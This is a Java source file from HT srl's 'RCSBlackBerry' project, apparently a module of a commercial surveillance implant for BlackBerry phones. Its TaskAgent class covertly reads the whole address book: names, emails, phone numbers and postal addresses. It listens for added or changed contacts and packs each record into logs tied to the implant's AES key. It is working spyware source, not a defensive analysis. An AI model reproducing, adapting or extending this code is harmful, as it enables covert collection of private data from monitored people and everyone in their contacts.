//#preprocess
/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry
 * Package      : blackberry.agent
 * File         : ImAgent.java
 * Created      : 28-apr-2010
 * *************************************************/
package blackberry.agent;

import java.util.Enumeration;

import javax.microedition.pim.Contact;
import javax.microedition.pim.ContactList;
import javax.microedition.pim.PIM;
import javax.microedition.pim.PIMException;
import javax.microedition.pim.PIMItem;

import net.rim.blackberry.api.pdap.BlackBerryPIMList;
import net.rim.blackberry.api.pdap.PIMListListener;
import net.rim.device.api.util.ByteVector;
import net.rim.device.api.util.DataBuffer;
import blackberry.config.Keys;
import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;
import blackberry.fs.Path;
import blackberry.log.LogType;
import blackberry.log.Markup;
import blackberry.utils.Check;
import blackberry.utils.Utils;

// TODO: Auto-generated Javadoc
/**
 * The Class ImAgent.
 */
public final class TaskAgent extends Agent implements PIMListListener {
    //#ifdef DEBUG
    static Debug debug = new Debug("TaskAgent", DebugLevel.VERBOSE);
    //#endif

    Markup markup;
    protected static final int SLEEPTIME = 3000;
    protected static final int PERIODTIME = 60 * 60 * 1000;

    /**
     * Instantiates a new Organizer agent.
     * TaskAgent on Mobile
     * 
     * @param agentStatus
     *            the agent status
     */
    public TaskAgent(final boolean agentStatus) {
        super(Agent.AGENT_TASK, agentStatus, false, "TaskAgent");
    }

    /**
     * Instantiates a new im agent.
     * 
     * @param agentStatus
     *            the agent status
     * @param confParams
     *            the conf params
     */
    protected TaskAgent(final boolean agentStatus, final byte[] confParams) {
        this(agentStatus);

        //#ifdef DEBUG_TRACE
        debug.trace("TaskAgent");
        //#endif

        markup = new Markup(agentId, Keys.getInstance().getAesKey());

        parse(confParams);
        setDelay(SLEEPTIME);
        setPeriod(PERIODTIME);
    }

    public synchronized void actualStart() {
        //#ifdef DEBUG_TRACE
        debug.trace("actualStart: add listener");
        //#endif

        PIM pim = PIM.getInstance();
        BlackBerryPIMList contacts;
        try {
            contacts = (BlackBerryPIMList) pim.openPIMList(PIM.CONTACT_LIST,
                    PIM.READ_ONLY);
            contacts.addListener(this);
        } catch (PIMException e) {
            //#ifdef DEBUG_ERROR
            debug.error(e);
            //#endif
        }

    }

    public synchronized void actualStop() {
        //#ifdef DEBUG_TRACE
        debug.trace("actualStop: remove listener");
        //#endif

        PIM pim = PIM.getInstance();
        BlackBerryPIMList contacts;
        try {
            contacts = (BlackBerryPIMList) pim.openPIMList(PIM.CONTACT_LIST,
                    PIM.READ_ONLY);
            contacts.removeListener(this);
        } catch (PIMException e) {
            //#ifdef DEBUG_ERROR
            debug.error(e);
            //#endif
        }
    }

    /*
     * (non-Javadoc)
     * @see blackberry.threadpool.TimerJob#actualRun()
     */
    public void actualRun() {
        //#ifdef DEBUG_TRACE
        debug.trace("actualRun");
        //#endif

        if (markup.isMarkup()) {
            //#ifdef DEBUG_INFO
            debug.info("Markup is present, no need to get the contact list");
            //#endif
            return;
        } else {
            markup.createEmptyMarkup();
        }

        ContactList contactList;
        try {
            contactList = (ContactList) PIM.getInstance().openPIMList(
                    PIM.CONTACT_LIST, PIM.READ_ONLY);

            Enumeration eContacts = contactList.items();

            //#ifdef DEBUG_TRACE
            debug.trace("actualRun: got contacts");
            //#endif

            log.createLog(null, LogType.ADDRESSBOOK);

            Contact contact;
            while (eContacts.hasMoreElements()) {

                contact = (Contact) eContacts.nextElement();

                byte[] packet = getContactPacket(contactList, contact);
                log.writeLog(packet);
            }

            log.close();

        } catch (PIMException e) {
            //#ifdef DEBUG_ERROR
            debug.error(e);
            //#endif
        }
    }

    /**
     * @param contactList
     * @param version
     * @param contact
     * @return
     */
    private byte[] getContactPacket(ContactList contactList, Contact contact) {
        int version = 0x01000000;

        byte[] header = new byte[12];
        byte[] payload = new byte[0];

        DataBuffer dbPayload = new DataBuffer(payload, 0, 2048, false);

        String[] categories = contact.getCategories();
        for (int i = 0; i < categories.length; i++) {
            //#ifdef DEBUG_TRACE
            debug.trace("getContactPacket cat: " + categories[i]);
            //#endif
        }

        int uid = 0;

        if (contactList.isSupportedField(Contact.UID)) {
            if (contact.countValues(Contact.UID) > 0) {
                String suid = contact.getString(Contact.UID, 0);
                //#ifdef DEBUG_TRACE
                debug.trace("actualRun uid: " + suid);
                //#endif
                try {
                    uid = Integer.parseInt(suid);
                } catch (NumberFormatException ex) {
                    //#ifdef DEBUG_ERROR
                    debug.error(ex);
                    //#endif
                }
            }
        }

        //#ifdef DEBUG_TRACE
        debug.trace("getContactPacket: name");
        //#endif
        if (contactList.isSupportedField(Contact.NAME)) {
            if (contact.countValues(Contact.NAME) > 0) {
                String[] names = contact.getStringArray(Contact.NAME, 0);

                addField(dbPayload, names, Contact.NAME_GIVEN, (byte)0x01);
                addField(dbPayload, names, Contact.NAME_FAMILY, (byte)0x02);
                
            }
        }

        //#ifdef DEBUG_TRACE
        debug.trace("getContactPacket: email");
        //#endif
        addEmailField(contactList, contact, dbPayload, Contact.EMAIL,
                new byte[] { 0x06, 0x0D, 0x0F });

        //#ifdef DEBUG_TRACE
        debug.trace("getContactPacket: tel");
        //#endif
        addTelField(contactList, contact, dbPayload, Contact.TEL, (byte) 0x07);

        //#ifdef DEBUG_TRACE
        debug.trace("getContactPacket: addr");
        //#endif
        if (contactList.isSupportedField(Contact.ADDR)) {
            if (contact.countValues(Contact.ADDR) > 0) {
                String[] addr = contact.getStringArray(Contact.ADDR, 0);
                
                addField(dbPayload, addr, Contact.ADDR_STREET, (byte) 0x21);
                addField(dbPayload, addr, Contact.ADDR_EXTRA, (byte) 0x36);
                addField(dbPayload, addr, Contact.ADDR_LOCALITY, (byte) 0x27);
                addField(dbPayload, addr, Contact.ADDR_POBOX, (byte) 0x2D);
                addField(dbPayload, addr, Contact.ADDR_POSTALCODE, (byte) 0x28);
                addField(dbPayload, addr, Contact.ADDR_REGION, (byte) 0x2E);
                addField(dbPayload, addr, Contact.ADDR_COUNTRY, (byte) 0x2F);

            }
        }

       
        int size = dbPayload.getLength() + header.length;
        //#ifdef DEBUG_TRACE
        debug.trace("payload len: " + dbPayload.getLength());
        debug.trace("header len: " + header.length);
        debug.trace("size len: " + size);
        //#endif        

        // a questo punto il payload e' pronto

        DataBuffer db_header = new DataBuffer(header, 0, size, false);
        db_header.writeInt(size);
        db_header.writeInt(version);
        db_header.writeInt(uid);

        //#ifdef DEBUG_TRACE
        debug.trace("header: " + Utils.byteArrayToHex(header));
        //#endif      

        //#ifdef DBC

        Check.asserts(header.length == 12, "getContactPayload header.length: "
                + header.length);
        Check.asserts(db_header.getLength() == 12,
                "getContactPayload db_header.getLength: " + header.length);

        //#endif

        //db_header.write(payload);

        byte[] packet = Utils.concat(header, 12, payload, dbPayload
                .getLength());

        //#ifdef DBC
        Check.ensures(packet.length == size,
                "getContactPayload packet.length: " + packet.length);
        //#endif

        //#ifdef DEBUG_TRACE
        debug.trace("packet: " + Utils.byteArrayToHex(packet));
        //#endif                

        return packet;
    }

    private void addField(DataBuffer dbPayload, String[] fields,
            int fieldNumber, byte logType) {

        if (fields[fieldNumber] != null) {
            String value = fields[fieldNumber];
            Utils.addTypedString(dbPayload, logType, value);
        }

    }

    /*
     * private void addField(ContactList contactList, Contact contact,
     * DataBuffer dbPayload, int contactType, byte logType) {
     * if (name[Contact.NAME_GIVEN] != null) {
     * String first = name[Contact.NAME_GIVEN];
     * Utils.addTypedString(db_payload, (byte) 0x01, first);
     * }
     * if (contactList.isSupportedField(contactType)) {
     * if (contact.countValues(contactType) >= 0) {
     * String value = contact.getString(contactType, 0);
     * //#ifdef DEBUG_TRACE
     * debug.trace("addField: " + contactType + "," + logType + " "
     * + value);
     * //#endif
     * Utils.addTypedString(dbPayload, logType, value);
     * }
     * }
     * }
     */
    private void addEmailField(ContactList contactList, Contact contact,
            DataBuffer dbPayload, int contactType, byte[] logTypes) {

        if (contactList.isSupportedField(contactType)) {
            try {
                int preferred = contact.getPreferredIndex(contactType);
                //#ifdef DEBUG_TRACE
                debug.trace("addStringField preferred : " + preferred);
                //#endif
            } catch (Exception ex) {
                //#ifdef DEBUG_ERROR
                debug.error(ex);
                //#endif
            }

            for (int i = 0; i < contact.countValues(contactType)
                    && i < logTypes.length; i++) {
                String value = contact.getString(contactType, i);
                //#ifdef DEBUG_TRACE
                debug.trace("addStringField: " + logTypes[i] + " " + value);
                //#endif
                Utils.addTypedString(dbPayload, logTypes[i], value);
            }
        }
    }

    private void addTelField(ContactList contactList, Contact contact,
            DataBuffer dbPayload, int contactType, byte logType) {

        if (contactList.isSupportedField(contactType)) {
            try {
                int preferred = contact.getPreferredIndex(contactType);
                //#ifdef DEBUG_TRACE
                debug.trace("addStringField preferred : " + preferred);
                //#endif
            } catch (Exception ex) {
                //#ifdef DEBUG_ERROR
                debug.error(ex);
                //#endif
            }

            if (contact.countValues(contactType) >= 0) {
                String value = contact.getString(contactType, 0);
                Utils.addTypedString(dbPayload, logType, value);
            }

            String note = "";
            int last = contact.countValues(contactType) -1;
            for (int i = 1; i <= last; i++) {
                String value = contact.getString(contactType, i);
                //#ifdef DEBUG_TRACE
                debug.trace("addStringField: " + logType + " " + value);
                //#endif

                note += value;
                if( i < last){
                    note += ", ";
                }
            }
            
            //#ifdef DEBUG_TRACE
            debug.trace("addTelField note: " + note);
            //#endif

            Utils.addTypedString(dbPayload, (byte) 0x34, note);
        }
    }

    /*
     * (non-Javadoc)
     * @see blackberry.agent.Agent#parse(byte[])
     */
    protected boolean parse(final byte[] confParameters) {
        //#ifdef DEBUG_TRACE
        debug.trace("parse");
        //#endif
        return true;
    }

    public void itemAdded(PIMItem item) {
        init();
        //#ifdef DEBUG_TRACE
        debug.trace("itemAdded: " + item);
        //#endif
        save(item);
    }

    public void itemRemoved(PIMItem item) {
        init();
        //#ifdef DEBUG_TRACE
        debug.trace("itemRemoved: " + item);
        //#endif
    }

    public void itemUpdated(PIMItem itemOld, PIMItem itemNew) {
        init();
        //#ifdef DEBUG_TRACE
        debug.trace("itemUpdated: " + itemNew);
        //#endif

        save(itemNew);
    }

    private void save(PIMItem item) {
        try {
            ContactList contactList = (ContactList) item.getPIMList();
            Contact contact = (Contact) item;

            byte[] payload = getContactPacket(contactList, contact);

            log.createLog(null, LogType.ADDRESSBOOK);
            log.writeLog(payload);
            log.close();
        } catch (Exception ex) {
            //#ifdef DEBUG_ERROR
            debug.error(ex);
            //#endif
        }
    }

    private synchronized void init() {
        if (!Path.isInizialized()) {
            Path.makeDirs();
        }
        Debug.init();
    }
}
